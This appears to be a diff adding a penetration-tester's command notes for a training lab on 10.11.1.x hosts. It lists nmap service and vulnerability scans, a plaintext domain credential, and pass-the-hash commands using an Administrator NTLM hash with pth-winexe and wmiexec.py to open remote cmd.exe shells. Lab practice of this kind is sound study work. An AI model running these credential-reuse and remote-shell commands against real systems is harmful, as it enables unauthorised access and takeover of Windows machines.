@@ -1,0 +1,22 @@
+nmap 10.11.1.220 -sV -sC -Pn > nmap.txt
+nmap 10.11.1.220 -sV -sC -Pn > nmap.txt
+
+
+
+nmap --script vuln -sV -p 21,53,88,135,139,389,445,464,593,636,3268,3269,3389 -Pn  10.11.1.220 > nmapvuln.txt
+
+thinc.local\alice -p aliceishere \\10.11.1.50 netstat
+
+pth-winexe -U thinc/Administrator%admin //10.11.1.220 cmd.exe
+
+
+
+python /usr/local/bin/wmiexec.py -hashes AAD3B435B51404EEAAD3B435B51404EE:XXXXXXXXXXXXXXXXX XXXXXXXXXXXXXXX Administrator@10.11.1.220
+
+pth-winexe -U WORKGROUP/Administrator%AAD3B435B51404EEAAD3B435B51404EE:af636dea707fa9cf431562c90e8a4044 //10.11.1.220
+pth-winexe -U WORKGROUP/Administrator%AAD3B435B51404EEAAD3B435B51404EE:af636dea707fa9cf431562c90e8a4044 //10.11.1.220 cmd.exe
+pth-winexe -U WORKGROUP/Administrator%aad3b435b51404eeaad3b435b51404ee:af636dea707fa9cf431562c90e8a4044 //10.11.1.120 cmd
+
+
+
+21,53,88,135,139,389,445,464,593,636,3268,3269,3389,
